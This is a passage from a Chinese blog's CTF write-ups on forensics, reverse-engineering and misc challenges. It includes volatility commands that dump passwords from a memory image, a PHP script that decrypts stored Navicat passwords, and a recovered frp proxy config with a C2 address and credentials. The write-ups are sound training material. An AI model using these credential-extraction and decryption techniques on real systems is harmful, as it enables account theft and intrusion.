href="#8-请分析流量分析-pcapng文件，并回答被入侵计算机开机时间是？" class="headerlink" title="8.请分析流量分析.pcapng文件，并回答被入侵计算机开机时间是？"></a>8.请分析流量分析.pcapng文件，并回答被入侵计算机开机时间是？</h3><pre><code>2019/6/13, 18:50:33</code></pre><p>被入侵后 在里面执行了systeminfo命令 可以看到上一次计算机的启动时间</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404271947511.png" alt="image-20240424211721791"></p><h3 id="9-请分析流量分析-pcapng文件，并回答被入侵计算机桌面上的文件中flag是？-答案格式：abcdef123456789"><a href="#9-请分析流量分析-pcapng文件，并回答被入侵计算机桌面上的文件中flag是？-答案格式：abcdef123456789" class="headerlink" title="9.请分析流量分析.pcapng文件，并回答被入侵计算机桌面上的文件中flag是？(答案格式：abcdef123456789)"></a>9.<strong>请分析流量分析.pcapng文件，并回答被入侵计算机桌面上的文件中flag是？(答案格式：abcdef123456789)</strong></h3><p>直接追踪tcp流 到第1364流</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404261725954.png" alt="image-20240426172559868"></p><h3 id="10-请分析流量分析-pcapng文件，并回答图片文件中的flag是？-答案格式：abcdef123456789"><a href="#10-请分析流量分析-pcapng文件，并回答图片文件中的flag是？-答案格式：abcdef123456789" class="headerlink" title="10.请分析流量分析.pcapng文件，并回答图片文件中的flag是？ (答案格式：abcdef123456789)"></a>10.<strong>请分析流量分析.pcapng文件，并回答图片文件中的flag是？ (答案格式：abcdef123456789)</strong></h3><p>http导出可以得到一个flag.png 末尾有压缩包</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404261726500.png" alt="image-20240426172615443"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404261726181.png" alt="image-20240426172624131"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404261726439.png" alt="image-20240426172634398"></p>]]></content>
      
      
      <categories>
          
          <category> 取证 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>2024数信杯北部赛区wp</title>
      <link href="/2024/05/02/2024%E6%95%B0%E4%BF%A1%E6%9D%AF/"/>
      <url>/2024/05/02/2024%E6%95%B0%E4%BF%A1%E6%9D%AF/</url>
      
        <content type="html"><![CDATA[<h1 id="2024数信杯"><a href="#2024数信杯" class="headerlink" title="2024数信杯"></a>2024数信杯</h1><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404302319982.png" alt="img"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404302319912.png" alt="img"></p><p>战队名：西柚喵帕斯 </p><p>排名：16</p><h2 id="数据安全"><a href="#数据安全" class="headerlink" title="数据安全"></a>数据安全</h2><h3 id="Drinktea"><a href="#Drinktea" class="headerlink" title="Drinktea"></a>Drinktea</h3><p>python字节码，分析转换成python源码</p><pre><code class="Python">from ctypes import c_uint32  import structdef encrypt(v, key):    v0 = c_uint32(v[0]).value    v1 = c_uint32(v[1]).value    delta = 555885348    total = c_uint32(0).value    for i in range(32):        v0 += ((v1 &lt;&lt; 4 ^ v1 &gt;&gt; 5) + v1) ^ (total + key[total &amp; 3] ^ v1)        total += delta        v1 += ((v0 &lt;&lt; 4 ^ v0 &gt;&gt; 5) + v0) ^ (total + key[total &gt;&gt; 11 &amp; 3] ^ v0)    return [v0, v1]key = [1900550021, 2483099539, 2205172504, 1359557939]arr = [    [392252415, 2941946969],    [1122976151, 1335193774],    [815478816, 2529100980],    [2237049875, 188954780]]flag = input(&#39;please input flag: &#39;)encry = []encryted = []for i in range(len(flag) // 8):    encry.append(struct.unpack(&#39;&lt;I&#39;, flag[i*8:(i+1)*8].encode(&#39;utf-8&#39;))[0])    encry.append(struct.unpack(&#39;&lt;I&#39;, flag[i*8+4:(i+1)*8].encode(&#39;utf-8&#39;))[0])    encrypted = encrypt(encry, key)    encryted.append(encrypted)if encryted == arr:    print(&#39;yes~&#39;)else:    print(&#39;no~&#39;)</code></pre><p>简单的xtea加密，把每一段结果拼起来包flag就可以</p><pre><code class="Python">from ctypes import * import structdef encrypt(v,k):    v0=c_uint32(v[0])    v1=c_uint32(v[1])    sum1=c_uint32(0)    delta=0x9e3779b9    for i in range(32):        v0.value+=(((v1.value&lt;&lt;4)^(v1.value&gt;&gt;5))+v1.value)^(sum1.value+k[sum1.value&amp;3])        sum1.value+=delta        v1.value+=(((v0.value&lt;&lt;4)^(v0.value&gt;&gt;5))+v0.value)^(sum1.value+k[(sum1.value&gt;&gt;11)&amp;3])    return v0.value,v1.value def decrypt(v,k):    v0=c_uint32(v[0])    v1=c_uint32(v[1])    delta=555885348    sum1=c_uint32(delta*32)    for i in range(32):        v1.value-=(((v0.value&lt;&lt;4)^(v0.value&gt;&gt;5))+v0.value)^(sum1.value+k[(sum1.value&gt;&gt;11)&amp;3])        sum1.value-=delta        v0.value-=(((v1.value&lt;&lt;4)^(v1.value&gt;&gt;5))+v1.value)^(sum1.value+k[sum1.value&amp;3])    return v0.value,v1.value a1=[392252415, 2941946969]a2=[1122976151, 1335193774]a3=[815478816, 2529100980]a4=[2237049875, 188954780]k = [1900550021, 2483099539, 2205172504, 1359557939]res1=decrypt(a1,k)res2=decrypt(a2,k)res3=decrypt(a3,k)res4=decrypt(a4,k)  print(struct.pack(&#39;&lt;I&#39;,res1[0]))print(struct.pack(&#39;&lt;I&#39;,res1[1]))print(struct.pack(&#39;&lt;I&#39;,res2[0]))print(struct.pack(&#39;&lt;I&#39;,res2[1]))print(struct.pack(&#39;&lt;I&#39;,res3[0]))print(struct.pack(&#39;&lt;I&#39;,res3[1]))print(struct.pack(&#39;&lt;I&#39;,res4[0]))print(struct.pack(&#39;&lt;I&#39;,res4[1]))# acb8739759dc496ccc945703037e037f</code></pre><h3 id="Rrrccc"><a href="#Rrrccc" class="headerlink" title="Rrrccc"></a>Rrrccc</h3><p>upx壳，直接脱脱不掉，winhex打开发现把”UPX”改成了”upx”，改回来就能直接<code>upx -d</code></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404302320589.png" alt="img"></p><p>ida打开看一下是SMC代码自修改，动调</p><p>反调试，patch一下修改跳转条件</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404302320131.png" alt="img"></p><p>cipher很明显直接写出来了</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404302320684.png" alt="img"></p><p>过了一遍流程推测flag和cipher长度应该是相等，直接拿cipher作输入</p><p>动调跑完拿到输入的第一层加密结果，和输入异或就能得到key1</p><p>第二层异或的key2直接动调出</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404302320631.png" alt="img"></p><p>exp：</p><pre><code class="Python">cipher = &quot;Whatareyourencryption&amp;decryptionbasics&quot;flag = []#先用key2解第二层key2 = [0x1C, 0x0CB, 0x0F5, 0x53, 0x91, 0x0CC, 0x3B, 0x66, 0x4, 0x7D, 0x0BA, 0x0D2, 0x56, 0x0CE, 0x14, 0x0A4, 0x0E8, 0x7F, 0x0C2, 0x0C4, 0x2B, 0x86, 0x32, 0x0F0, 0x0F7, 0x0EA, 0x0FB, 0x0F0, 0x78, 0x34, 0x9A, 0x3, 0x13, 0x0A2, 0x91, 0x37, 0x48, 0x66]for i in range(38):    flag.append(ord(cipher[i]) ^ key2[i])#求key1cipher1 = [0x7A, 0xA7, 0x94, 0x34, 0xEA, 0xA8, 0x08, 0x02, 0x66, 0x4B,   0x83, 0xB3, 0x65, 0xFA, 0x75, 0x91, 0xD9, 0x1B, 0xF5, 0xA1,   0x1A, 0xE2, 0x00, 0xC3, 0x93, 0xDC, 0xC9, 0xC1, 0x4D, 0x0D,   0xAA, 0x3B, 0x21, 0x95, 0xF2, 0x07, 0x79, 0x1B,]input = &quot;Whatareyourencryption&amp;decryptionbasics&quot;key1 = []for i in range(len(cipher1)):    key1.append(cipher1[i] ^ ord(input[i]))#最后把第二层解密结果用key1解for i in range(len(flag)):    flag[i] ^= key1[i]    print(chr(flag[i]),end=&#39;&#39;)    #flag&#123;d3db69a34a51d7e1d23d621590827c01&#125;</code></pre><h3 id="Magic-Audio"><a href="#Magic-Audio" class="headerlink" title="Magic Audio"></a>Magic Audio</h3><p>拿到一个wav文件 先看文件尾 有个压缩包 提取出来</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404302321988.png" alt="img"></p><p>发现有密码 听一下这个音频 慢扫描电视 用sstv直接转</p><pre><code class="Bash">sstv -d ctf.wav -o out.png </code></pre><p>得到out.png</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404302321306.png" alt="img"></p><p>使用这个菜就多练作为密码进行解压 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404302321966.png" alt="img"></p><h2 id="数据分析"><a href="#数据分析" class="headerlink" title="数据分析"></a>数据分析</h2><h3 id="不安全的U盘1"><a href="#不安全的U盘1" class="headerlink" title="不安全的U盘1"></a>不安全的U盘1</h3><pre><code>请提交小明电脑中的test账户的密码(格式为hash对应的明文,长度为9)</code></pre><p>直接lsadump获得强密码</p><pre><code class="Bash">.\volatility.exe -f E:\Desktop\数信杯\file1\不安全的U盘_3ba0c570fac7eef3e90acc3eaabb5c8d\1.raw --profile=Win7SP1x64 lsadump</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404302329864.png" alt="img"></p><p>hahaha123</p><h3 id="不安全的U盘2-赛后复盘"><a href="#不安全的U盘2-赛后复盘" class="headerlink" title="不安全的U盘2(赛后复盘)"></a>不安全的U盘2(赛后复盘)</h3><p>答案要求是去掉空格后是56位字符</p><p>最令我无语的一道题 当时已经把那个程序路径找到了 但是因为sb txt文档给我显示一共是57列 自己数的时候不知道为什么死活数不出来56位 最后错失一题的分数 </p><p>展示一下当时的做题截图 我真的是把可能的所有情况都列出来了  但其实第一个就是正确答案 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404302315946.png" alt="image-20240430113716050"></p><p>下面简单说一下做法 首先根据题干 我们得知是因为一个pdf文件导致系统被入侵 我们直接在r-studio中进行寻找并导出</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404302315272.png" alt="image-20240430115702665"></p><p>将这个<code>README.pdf</code>放入沙箱进行分析 看到执行流程中存在<code>AcroRd32.exe</code></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404302315180.png" alt="image-20240430115747055"></p><p>在vol中搜索一下这个程序</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404302315901.png" alt="image-20240430115949722"></p><p>直接在红框前面加上盘符再去掉空格就是正确答案</p><pre><code>C:\Program Files (x86)\Adobe\Reader 9.0\Reader\AcroRd32.exeC:\ProgramFiles(x86)\Adobe\Reader9.0\Reader\AcroRd32.exe</code></pre><h3 id="不安全的U盘3"><a href="#不安全的U盘3" class="headerlink" title="不安全的U盘3"></a>不安全的U盘3</h3><p>请提交控制小明的服务器地址:端口(格式为”ip:port”,长度为19)</p><p>netscan查看网络连接情况</p><pre><code class="Bash">.\volatility.exe -f E:\Desktop\数信杯\file1\不安全的U盘_3ba0c570fac7eef3e90acc3eaabb5c8d\1.raw --profile=Win7SP1x64 netscan</code></pre><p>找外网ip</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404302332523.png" alt="img"></p><h3 id="不安全的U盘4-赛后复盘"><a href="#不安全的U盘4-赛后复盘" class="headerlink" title="不安全的U盘4(赛后复盘)"></a>不安全的U盘4(赛后复盘)</h3><pre><code>找到外联地址 </code></pre><p>直接使用vol查看<code>.exe</code>文件</p><pre><code>.\volatility.exe -f E:\Desktop\比赛\2024数信杯\数据分析\file1\不安全的U盘_3ba0c570fac7eef3e90acc3eaabb5c8d\1.raw --profile=Win7SP1x64 filescan | findstr &quot;.exe&quot;</code></pre><p>看到两个比较可疑的文件 都提取出来看看 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404302317975.png" alt="image-20240430153506056"></p><p>放入沙箱分析</p><p>hh.exe的通信并不是外部地址 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404302317185.png" alt="image-20240430154052457"></p><p>但是f.exe同文件夹下有个toml软件程序配置文件 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404302317550.png" alt="image-20240430155011474"></p><p>提取出来 看一下内容</p><pre><code>[common]serverAddr = &quot;118.180.126.13&quot;serverPort = 6770[plugin_socks]type = &quot;tcp&quot;remote_port = 32124plugin = &quot;socks5&quot;plugin_user = &quot;admin&quot;plugin_passwd = &quot;admin123@qwe&quot;use_encryption = trueuse_compression = true</code></pre><p>所以外联地址是</p><pre><code>118.180.126.13</code></pre><p>也可以直接在镜像文件中搜索<code>remote_port</code>这种配置文件中常出现的信息</p><h3 id="网站数据绝对安全1"><a href="#网站数据绝对安全1" class="headerlink" title="网站数据绝对安全1"></a>网站数据绝对安全1</h3><p>系统中存在的用户名是什么？</p><p>多亏后面补充了提交次数 一个个试都试出来了</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404302333537.png" alt="img"></p><h3 id="网站数据绝对安全2"><a href="#网站数据绝对安全2" class="headerlink" title="网站数据绝对安全2"></a>网站数据绝对安全2</h3><p>key3的的值是什么？</p><p>在http导出中提取出来一个safe.html</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404302333354.png" alt="img"></p><p>但是使用浏览器打开是</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404302333336.png" alt="img"></p><p>发现直接复制不行 手动输入可以 </p><p>后面看了一下源码 大概率是和这个字体有关系</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404302333523.png" alt="img"></p><h3 id="Bitcoin1-赛后复盘"><a href="#Bitcoin1-赛后复盘" class="headerlink" title="Bitcoin1(赛后复盘)"></a>Bitcoin1(赛后复盘)</h3><p>附件拿到的是一个Computer.ad1镜像文件 使用FTK Imager可以进行挂载 </p><p>挂载的过程实在是太难受了 4.5版本的死活挂不上 后面用4.2的才挂上</p><p>在挂载的时候 一定要注意 先选择<code>Add Evidence Item</code> 将镜像添加为证据项</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404302317656.png" alt="image-20240430204309975"></p><p>在添加的证据项出选择挂载镜像</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404302317991.png" alt="image-20240430204327332"></p><p>成功挂载上</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404302317535.png" alt="image-20240430204342877"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404302317970.png" alt="image-20240430204352382"></p><p>挂载好后使用火眼分析磁盘中的文件夹 选择添加文件集合检材 在ShimCache中可以看到一个比特币钱包的安装程序的最后修改时间 那这个应该就是 <code>2022-01-05 10:21:16</code></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404302317174.png" alt="image-20240430214903734"></p><h3 id="Bitcoin2-赛后复盘"><a href="#Bitcoin2-赛后复盘" class="headerlink" title="Bitcoin2(赛后复盘)"></a>Bitcoin2(赛后复盘)</h3><p>打开powershell 使用findwallet这个工具来查找加密比特币钱包文件</p><pre><code>安装npm install findwallet -g使用findwallet -i [inputPath/inputFile] -o [outputFile] -i     : Required. Specify which path(s) to scan directly or through a newline separated file. -o     : Specify optional output file where to store wallet paths if any exist. -h     : Displays this message.</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404302317366.png" alt="image-20240430212918786"></p><p>在前面加上盘符</p><pre><code>C:\Windows\System32\config\systemprofile\AppData\Roaming\Microsoft\SystemCertificates\My\AppContainerUserCertRead.sys</code></pre><h3 id="Bitcoin3-赛后复盘"><a href="#Bitcoin3-赛后复盘" class="headerlink" title="Bitcoin3(赛后复盘)"></a>Bitcoin3(赛后复盘)</h3><p>在<code>Users\Daddy\Downloads</code>文件夹下发现了bitcoin钱包程序的安装包<code>bitcoin-22.0-win64-setup.exe</code> 导出安装一下 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404302317048.png" alt="image-20240430213504602"></p><p>打开之后新建一个钱包<code>test</code></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404302317344.png" alt="image-20240430213711950"></p><p>将上面bitcoin2导出的钱包文件替换掉<code>Bitcoin\bitcoin\wallets\test\wallet.dat</code>   注意要将上面找到的<code>AppContainerUserCertRead.sys</code> 改名为<code>wallet.dat</code>  再次重启软件 直接点隐藏</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404302318825.png" alt="image-20240430214548135"></p><p>点击交易记录  第二条</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202405022151660.png" alt="image-20240502215102589"></p><p>找到钱包地址</p><pre><code>bc1qf3lta6zr9k4kt9q25sz47vdcnn73zyzk0m5gvz</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202405022151670.png" alt="image-20240502215119629"></p><h3 id="Bitcoin4"><a href="#Bitcoin4" class="headerlink" title="Bitcoin4"></a>Bitcoin4</h3><p>在合约CTF.sol中存在一处漏洞，该漏洞是由哪一函数造成的(比如:exec)？</p><p>gpt做题法 算是非预期解 直接喂合约的完整代码进行分析 </p><pre><code class="Bash">在这个合约文件中存在一处漏洞，由transferFrom函数造成。具体来说，这个漏洞出现在以下代码段：solidityCopy codefunction transferFrom(address from, address to, uint256 value) public notFrozen(from) returns (bool) &#123;    require(msg.sender == owner);    return super.transferFrom(from, to, value);&#125;在这段代码中，漏洞是由于require语句的条件不够严格导致的。当前的transferFrom函数实现要求调用者必须是owner，但是并没有检查调用者是否具有足够的授权来执行转账操作。因此，任何拥有owner权限的地址都可以调用transferFrom函数，而无需经过持有者的授权。</code></pre>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> misc </tag>
            
            <tag> re </tag>
            
            <tag> forensics </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2024数字中国</title>
      <link href="/2024/04/29/2024%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD/"/>
      <url>/2024/04/29/2024%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD/</url>
      
        <content type="html"><![CDATA[<h1 id="2024数字中国"><a href="#2024数字中国" class="headerlink" title="2024数字中国"></a>2024数字中国</h1><p>被职业哥们干爆了 但是学生组好像人比较少 侥幸拿了个北区第一</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404281639162.png" alt="image-20240428163912024"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404292306992.png" alt="image-20240429230609921"></p><h2 id="重要的System32"><a href="#重要的System32" class="headerlink" title="重要的System32"></a>重要的System32</h2><pre><code>小明把自己的System32文件分享出去了，不小心泄露了重要数据（虚拟机做好快照后，在虚拟机中分析；flag的提交格式为 flag&#123;uuid&#125; ）三个部分的flag关注 注册表、winevt\Logs、OBJECTS.DATA</code></pre><p>就按照给的提示 从注册表 winevt\Logs文件夹中 OBJECTS.DATA文件中搜有相关flag的字段就好 考验一个眼力(bushi)</p><p>第二部分</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404292225295.png" alt="image-20240429210313730"></p><pre><code>-834f-f797</code></pre><p>第一部分 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404292225572.png" alt="image-20240429210707535"></p><pre><code>&#123;ef63fcbc-3467</code></pre><p>第三部分 翻注册表</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404292225389.png" alt="image-20240429211545409"></p><p>找到一个Pwd 还有flag文件路径是<code>C:\\Users\\Administrator\\Documents\\Navicat\\MySQL\\Servers\\f1a4_3</code> 看起来是让我们破解Navicat连接的密码 找个php代码</p><pre><code class="php">&lt;?phpclass NavicatPassword&#123;    protected $version = 0;    protected $aesKey = &#39;libcckeylibcckey&#39;;    protected $aesIv = &#39;libcciv libcciv &#39;;    protected $blowString = &#39;3DC5CA39&#39;;    protected $blowKey = null;    protected $blowIv = null;         public function __construct($version = 12)    &#123;        $this-&gt;version = $version;        $this-&gt;blowKey = sha1(&#39;3DC5CA39&#39;, true);        $this-&gt;blowIv = hex2bin(&#39;d9c7c3c8870d64bd&#39;);    &#125;         public function encrypt($string)    &#123;        $result = FALSE;        switch ($this-&gt;version) &#123;            case 11:                $result = $this-&gt;encryptEleven($string);                break;            case 12:                $result = $this-&gt;encryptTwelve($string);                break;            default:                break;        &#125;                 return $result;    &#125;         protected function encryptEleven($string)    &#123;        $round = intval(floor(strlen($string) / 8));        $leftLength = strlen($string) % 8;        $result = &#39;&#39;;        $currentVector = $this-&gt;blowIv;                 for ($i = 0; $i &lt; $round; $i++) &#123;            $temp = $this-&gt;encryptBlock($this-&gt;xorBytes(substr($string, 8 * $i, 8), $currentVector));            $currentVector = $this-&gt;xorBytes($currentVector, $temp);            $result .= $temp;        &#125;                 if ($leftLength) &#123;            $currentVector = $this-&gt;encryptBlock($currentVector);            $result .= $this-&gt;xorBytes(substr($string, 8 * $i, $leftLength), $currentVector);        &#125;                 return strtoupper(bin2hex($result));    &#125;         protected function encryptBlock($block)    &#123;        return openssl_encrypt($block, &#39;BF-ECB&#39;, $this-&gt;blowKey, OPENSSL_RAW_DATA|OPENSSL_NO_PADDING);    &#125;         protected function decryptBlock($block)    &#123;        return openssl_decrypt($block, &#39;BF-ECB&#39;, $this-&gt;blowKey, OPENSSL_RAW_DATA|OPENSSL_NO_PADDING);    &#125;         protected function xorBytes($str1, $str2)    &#123;        $result = &#39;&#39;;        for ($i = 0; $i &lt; strlen($str1); $i++) &#123;            $result .= chr(ord($str1[$i]) ^ ord($str2[$i]));        &#125;                 return $result;    &#125;         protected function encryptTwelve($string)    &#123;        $result = openssl_encrypt($string, &#39;AES-128-CBC&#39;, $this-&gt;aesKey, OPENSSL_RAW_DATA, $this-&gt;aesIv);        return strtoupper(bin2hex($result));    &#125;         public function decrypt($string)    &#123;        $result = FALSE;        switch ($this-&gt;version) &#123;            case 11:                $result = $this-&gt;decryptEleven($string);                break;            case 12:                $result = $this-&gt;decryptTwelve($string);                break;            default:                break;        &#125;                 return $result;    &#125;         protected function decryptEleven($upperString)    &#123;        $string = hex2bin(strtolower($upperString));                 $round = intval(floor(strlen($string) / 8));        $leftLength = strlen($string) % 8;        $result = &#39;&#39;;        $currentVector = $this-&gt;blowIv;                 for ($i = 0; $i &lt; $round; $i++) &#123;            $encryptedBlock = substr($string, 8 * $i, 8);            $temp = $this-&gt;xorBytes($this-&gt;decryptBlock($encryptedBlock), $currentVector);            $currentVector = $this-&gt;xorBytes($currentVector, $encryptedBlock);            $result .= $temp;        &#125;                 if ($leftLength) &#123;            $currentVector = $this-&gt;encryptBlock($currentVector);            $result .= $this-&gt;xorBytes(substr($string, 8 * $i, $leftLength), $currentVector);        &#125;                 return $result;    &#125;         protected function decryptTwelve($upperString)    &#123;        $string = hex2bin(strtolower($upperString));        return openssl_decrypt($string, &#39;AES-128-CBC&#39;, $this-&gt;aesKey, OPENSSL_RAW_DATA, $this-&gt;aesIv);    &#125;&#125;;  //需要指定版本两种，11或12//$navicatPassword = new NavicatPassword(11);$navicatPassword = new NavicatPassword(11); //解密//$decode = $navicatPassword-&gt;decrypt(&#39;15057D7BA390&#39;);$decode = $navicatPassword-&gt;decrypt(&#39;FB916DAFA4CE92143350DCF66AE9&#39;); // navicat密钥echo $decode.&quot;\n&quot;;?&gt;</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404292226757.png" alt="image-20240429212426207"></p><p>拿到第三部分</p><pre><code>-185817e5f846&#125;</code></pre><p>合起来</p><pre><code>flag&#123;ef63fcbc-3467-834f-f797-185817e5f846&#125;</code></pre><h2 id="Strangesystem-NTLMv2哈希计算"><a href="#Strangesystem-NTLMv2哈希计算" class="headerlink" title="Strangesystem(NTLMv2哈希计算)"></a>Strangesystem(NTLMv2哈希计算)</h2><pre><code>你是一名安全防护人员，你发现有人成功入侵了公司的服务器，你查找有关的流量设备，发现了一个流量包文件，你认为它可能包含了一些重要的信息。但是当你打开它时，你发现它被加密了：你觉得这个文件可能被某种奇怪的系统加密过，你想要找出加密算法并解密出文件内容。</code></pre><p>拿到一个流量 先看http导出 有张<code>q.png</code> 直接导出</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404292226598.png" alt="image-20240429153504477"></p><p>使用010打开 发现尾部存在压缩包 导出并保存 压缩包真加密存在解压密码</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404292226165.png" alt="image-20240429153736350"></p><p>看到压缩包尾部也存在额外信息 先留着 回来看流量包 QUIC协议的流量包存在加密 搜一下解密方法</p><p><a href="https://blog.csdn.net/qq_37177958/article/details/120476794">Wireshark对QUIC包的抓包和解包</a></p><p>简单来说 就是使用在抓包时获得的关于TLS握手信息的密钥日志文件 在wireshark编辑——首选项——Protocols——TLS 中将日志文件添加进(Pre)-Master-Secret   Log filename中就可以进行解密</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404292226671.png" alt="image-20240429155157374"></p><p>这个日志密钥文件 就是我们上面在压缩包后面发现的内容 将这部分信息另存为<code>sshkey.log</code>文件 放入上面提到的位置 就可以进行解密</p><pre><code>SERVER_HANDSHAKE_TRAFFIC_SECRET e8ef73b91b4c9d6e37113bcc88465a7f61badb5fd87177ca51c24ceab944b34a 82ec3ebf3131b2442d165bb00dd6b8d1a6b4c866daf3fd373c22d33886290ed2868a7395e691980b990de46b76a54f9eCLIENT_HANDSHAKE_TRAFFIC_SECRET e8ef73b91b4c9d6e37113bcc88465a7f61badb5fd87177ca51c24ceab944b34a 10965df426257a285c6e812ed54468c59437e77bceff2c3a6d633dacefadf8188e97c4935df6815e5398b24273addc79SERVER_TRAFFIC_SECRET_0 e8ef73b91b4c9d6e37113bcc88465a7f61badb5fd87177ca51c24ceab944b34a cdbf7c7a161af7aa829b14becaa2c000b8183000983e06589fef0c50e9462cf71aeb487e1cb1defaef06a941234ea7a2CLIENT_TRAFFIC_SECRET_0 e8ef73b91b4c9d6e37113bcc88465a7f61badb5fd87177ca51c24ceab944b34a e58e4088a7840d3991ac2336c581d2a35edbebfd14420a29c287444c3631dc98038b71f1d153cd37ba46164145a028fd</code></pre><p>解密之后追踪QUIC流 可以看到一组账密和一个html网页</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404292226193.png" alt="image-20240429155557247"></p><p>网页文件中的内容是</p><pre><code>admin::SecretServer:d158262017948de9:xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx:010100000000000058b2da67cbe0d001c575cfa48d38bec50000000002001600450047004900540049004d002d00500043003100340001001600450047004900540049004d002d00500043003100340004001600650067006900740069006d002d00500043003100340003001600650067006900740069006d002d0050004300310034000700080058b2da67cbe0d0010600040002000000080030003000000000000000000000000030000065d85a4000a167cdbbf6eff657941f52bc9ee2745e11f10c61bb24db541165800a001000000000000000000000000000000000000900240063006900660073002f003100390032002e003100360038002e0031002e00310030003700000000000000000000000000</code></pre><p>中间未知的部分是NETntlmv2的值 我们可以通过前面的一组账密和已知的ntlm值得到NETntlmv2的值 在此之前 我们先一起来学习一些概念 下面我是参考学习的文章</p><p><a href="https://3gstudent.github.io/Windows%E4%B8%8B%E7%9A%84%E5%AF%86%E7%A0%81hash-NTLM-hash%E5%92%8CNet-NTLM-hash%E4%BB%8B%E7%BB%8D">Windows下的密码hash——NTLM hash和Net-NTLM hash介绍</a></p><p><a href="https://en.wikipedia.org/wiki/NTLM">NTML</a></p><p><a href="https://medium.com/@notahades/what-is-ntlmv2-31153aa3102c">什么是NTMLv2</a></p><p><a href="https://stackoverflow.com/questions/32272615/is-it-possible-to-convert-netmtlmv2-hash-to-ntlm-hash">由NTLM哈希计算出NETntlmv2哈希</a></p><pre><code>NTLM 是一种质询-响应身份验证协议 NTLM 协议使用两个散列密码值中的一个或两个，这两个值也存储在服务器（或域控制器）上，并且通过缺少加盐，它们是等效的密码，这意味着如果您从服务器获取散列值，您可以在不知道实际密码的情况下进行身份验证。这两个是LM 哈希（基于DES 的函数，应用于将密码的前 14 个字符转换为该语言的传统 8 位 PC 字符集）和 NT 哈希（小端UTF-16 Unicode密码的MD4 ） ）。两个哈希值均为 16 字节（128 位）。NTLM 协议还使用两个单向函数之一，具体取决于 NTLM 版本； NT LanMan 和 NTLM 版本 1 使用基于 DES 的 LanMan 单向功能 (LMOWF)，而 NTLMv2 使用基于 NT MD4的单向功能 (NTOWF)   这个MD4的加密方法后面也会提到</code></pre><pre><code>NTLM hash通常是指Windows系统下Security Account Manager中保存的用户密码hash该hash的生成方法：将明文口令转换成十六进制的格式转换成Unicode格式，即在每个字节之后添加0x00对Unicode字符串作MD4加密，生成32位的十六进制数字串</code></pre><pre><code>NTLMv2（NT LAN Manager 版本 2） 也是一种质询-响应身份验证协议 NTLMv2 发送两个对 8 字节服务器质询的响应。每个响应包含服务器质询的16 字节HMAC - MD5哈希值、完全/部分随机生成的客户端质询以及用户密码和其他标识信息的 HMAC-MD5 哈希值。NTLMv2的主要功能：1.身份验证协议 2.质询-响应机制 3.散列和加密 NTLMv2 依赖加密技术来保护身份验证数据。它使用 HMAC-MD5（具有 MD5 